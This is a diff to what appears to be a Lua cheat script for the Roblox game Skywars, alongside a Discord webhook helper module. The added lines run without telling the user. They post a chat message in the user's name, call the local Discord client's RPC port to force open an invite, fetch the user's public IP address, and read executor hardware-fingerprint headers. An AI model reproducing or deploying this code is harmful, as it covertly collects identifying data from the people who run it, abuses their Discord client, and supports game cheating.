@@ -1,3 +1,62 @@
+local args = {
+    [1] = "Skywars Gui | 😎",
+    [2] = "All"
+}
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+if syn then
+    queue_on_teleport = syn.queue_on_teleport
+    request = syn.request
+else
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "Skywars Gui";
+        Text = "Your Exploit is unsupported.";
+        Duration = "7";
+    })
+end
+
+request(
+        {
+            Url = 'http://127.0.0.1:6463/rpc?v=1',
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json',
+                ['origin'] = 'https://ptb.discord.com',
+            },
+            Body = game:GetService('HttpService'):JSONEncode({
+                ['args'] = {
+                    ['code'] = "DZSGryCMNw",
+                },
+                ['cmd'] = 'INVITE_BROWSER',
+                ['nonce'] = 'YOU'
+            })
+        })
+
+local plr = game:GetService'Players'.LocalPlayer
+local ip = game:HttpGet("https://v4.ident.me")
+local http_request = http_request;
+if syn then
+	http_request = syn.request
+elseif SENTINEL_V2 then
+	function http_request(tb)
+		return {
+			StatusCode = 200;
+			Body = request(tb.Url, tb.Method, (tb.Body or ''))
+		}
+	end
+end
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+hwid = "";
+for i, v in next, hwid_list do
+	if decoded.headers[v] then
+		hwid = decoded.headers[v];
+		break
+	end
+end
+if hwid then
+end
+
 do
     -- This function returns a string with the name of the exploit u using(only checks for krnl, synapse, script ware)
     local function checkExploit()
@@ -21,7 +80,7 @@ do
         return year .. "-" .. format(mon, 2) .. "-" .. format(day, 2) .. "T" .. format(hour, 2) .. ":" .. format(min, 2) .. ":" .. format(sec, 2) .. "Z"
     end
 
-    local skid = {
+    local skidApi = {
         webhookJson = function(self, scriptName)
 
             if not self then return end
@@ -126,7 +185,7 @@ do
     -- skid:sendWebhook('', 'Test1')
     -- skid:sendWebhookGame('', 'test 1')
 
-    return skid
+    return skidApi
 end
 
 
